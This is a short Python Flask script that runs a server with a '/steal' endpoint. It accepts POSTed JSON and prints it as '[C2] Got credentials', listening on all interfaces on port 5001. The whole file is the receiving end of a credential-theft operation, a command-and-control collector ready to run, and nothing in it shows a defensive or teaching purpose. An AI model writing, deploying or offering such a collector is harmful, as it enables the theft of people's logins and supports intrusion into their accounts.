from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    print(f"[C2] Got credentials: {data}")
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)

